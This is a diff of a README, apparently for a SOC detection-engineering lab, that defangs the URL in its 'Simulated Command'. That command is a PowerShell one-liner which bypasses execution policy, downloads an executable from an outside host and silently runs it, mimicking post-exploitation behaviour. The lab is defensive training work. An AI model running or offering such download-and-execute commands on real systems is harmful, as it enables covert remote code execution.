@@ -35,7 +35,7 @@ The lab simulates a real-world SOC detection engineering and incident response w
 - Silent installation of a binary
 
 ## 🧪 Simulated Command
-cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
+cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'hxxps://sacyberrange00[.]blob.core[.]windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
 This behavior mimics post-exploitation techniques commonly observed in RCE incidents.
 
 ## 🧠 Detection Engineering
